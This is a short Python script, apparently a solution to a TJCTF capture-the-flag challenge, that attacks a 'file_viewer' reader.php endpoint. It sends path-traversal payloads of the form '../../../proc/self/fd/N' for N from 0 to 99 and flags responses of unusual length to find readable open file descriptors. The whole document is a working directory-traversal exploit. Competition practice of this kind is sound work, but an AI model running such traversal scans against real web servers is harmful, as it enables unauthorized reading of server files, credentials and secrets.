import requests

url = 'https://file_viewer.tjctf.org/reader.php'



keys = []
for i in range(100):
    payload = '../../../proc/self/fd/{}'.format(i)
    param = { 'file' : payload}
    print 'payload: ' + payload
    res = requests.get(url, params = param)
    if len(res.text) != 2419:
        raw_input(res.text)
        keys.append(i)




